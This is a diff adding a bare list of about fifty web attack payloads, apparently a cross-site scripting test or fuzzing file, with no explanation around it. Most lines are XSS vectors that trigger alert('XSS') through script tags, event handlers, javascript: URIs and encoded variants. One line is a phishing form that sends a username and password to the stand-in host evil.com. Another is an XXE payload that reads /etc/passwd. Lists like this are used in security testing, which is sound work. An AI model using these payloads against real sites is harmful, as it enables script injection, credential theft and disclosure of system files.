@@ -1,0 +1,50 @@
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+javascript:alert('XSS')
+<svg/onload=alert('XSS')>
+<button onclick="alert('XSS')">Click me</button>
+<body onload="alert('XSS')">
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert('XSS')">Click here</a>
+<svg><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a></svg>
+<form action="http://evil.com" method="post"><input type="text" name="username"><input type="password" name="password"><input type="submit"></form>
+<div style="background-image: url('javascript:alert(\'XSS\')')">XSS</div>
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+<input value="<script>alert('XSS')">
+{"name":"<script>alert('XSS')"}
+<style>body{background:url("javascript:alert('XSS')")}</style>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
+<div onmouseover="alert('XSS')">Hover over me</div>
+http://example.com/?q=<script>alert('XSS')</script>
+%253Cscript%253Ealert('XSS')%253C/script%253E
+<svg/onload=alert('XSS')>
+<a href="http://example.com?query=<script>alert('XSS')</script>">Click here</a>
+<img src="nonexistent.jpg" onerror="alert('XSS')">
+<object data="javascript:alert('XSS')"></object>
+<input onfocus="alert('XSS')">Click me</input>
+<video src="invalid" onerror="alert('XSS')"></video>
+<input type="text" name="query" value="><script>alert('XSS')</script>">
+<!-- <script>alert('XSS')</script> -->
+<applet code="javascript:alert('XSS')"></applet>
+<frame src="javascript:alert('XSS')"></frame>
+<base href="javascript:alert('XSS')">
+<audio src="invalid" onerror="alert('XSS')"></audio>
+<form action="javascript:alert('XSS')">
+<button formaction="javascript:alert('XSS')">Submit</button>
+<marquee onstart="alert('XSS')">XSS</marquee>
+<table background="javascript:alert('XSS')">
+<input type="image" src="javascript:alert('XSS')">
+<input placeholder="<script>alert('XSS')">
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>
+<!-- <script>alert('XSS')</script> -->
+<input onkeyup="alert('XSS')">Press a key</input>
+<svg><animate attributeName="x" values="0;100" dur="1s" repeatCount="indefinite" onbegin="alert('XSS')"/></svg>
+<input oninput="alert('XSS')">Type here</input>
+<div title="<script>alert('XSS')">Hover over me</div>
+<input oncut="alert('XSS')">Cut me</input>
+<input oncopy="alert('XSS')">Copy me</input>
+<input onpaste="alert('XSS')">Paste here</input>
+<input onchange="alert('XSS')">Change me</input>
+<base href="javascript://"/><a href="alert('XSS')">Click here</a>
+<input onblur="alert('XSS')">Blur me</input>
+<script src="invalid.js" onerror="alert('XSS')"></script>
